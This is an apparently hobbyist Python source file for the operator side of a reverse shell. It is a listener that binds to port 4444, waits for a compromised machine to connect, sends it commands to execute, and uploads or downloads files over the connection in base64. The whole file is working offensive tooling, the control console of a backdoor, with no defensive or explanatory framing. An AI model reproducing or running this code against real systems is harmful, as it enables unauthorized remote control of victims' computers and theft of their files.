import socket,json
import base64

class Listener:
    def __init__(self,ip,port):

        listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("172.17.221.78",4444))   #binding our socket so we can listen to port 4444
        listener.listen(0)                    #no of connection that can be queued before connection refused
        print("[+] Waiting for incoming connection")
        self.connection,address=listener.accept()                     #if u get a connection then accept it
        print("[+] Got a connection from"+str(address))
   
    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data)
    
    def reliable_receive(self):      #using loop because it send all data
        json_data=""
        while True:
            try:
                json_data=json_data+self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self,command):
        self.reliable_send(command)
        if command[0]=="exit":
            self.connection.close()
            exit()
        
        return self.reliable_receive()
    
    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Successful"
    
    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())
    def run(self):
        while True:
             command=raw_input(">> ")
             command=command.split(" ")    
             try:
                 if command[0] == "upload":
                    file_content=self.read_file(command[1])
                    command.append(file_content)
                 result=self.execute_remotely(command)
                 if command[0]=="download" and "[-] Error " not in result:
                    result=self.write_file(command[1],result)
             except Exception:
                 result="[-] Error during command execution"
             print(result)
